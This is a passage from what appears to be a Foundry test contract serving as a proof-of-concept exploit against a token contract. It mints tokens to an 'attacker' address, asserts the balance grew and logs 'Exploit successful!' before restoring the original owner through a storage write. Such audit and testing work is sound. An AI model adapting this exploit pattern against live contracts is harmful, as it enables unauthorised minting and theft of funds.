        target.issue(mintAmount);

        // Check final balance
        uint256 finalBalance = target.balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);

        // Verify the exploit worked
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
        console.log("Exploit successful! Balance increased by:", finalBalance - initialBalance);

        // Restore original owner (optional, for cleanup)
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(originalOwner))));
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

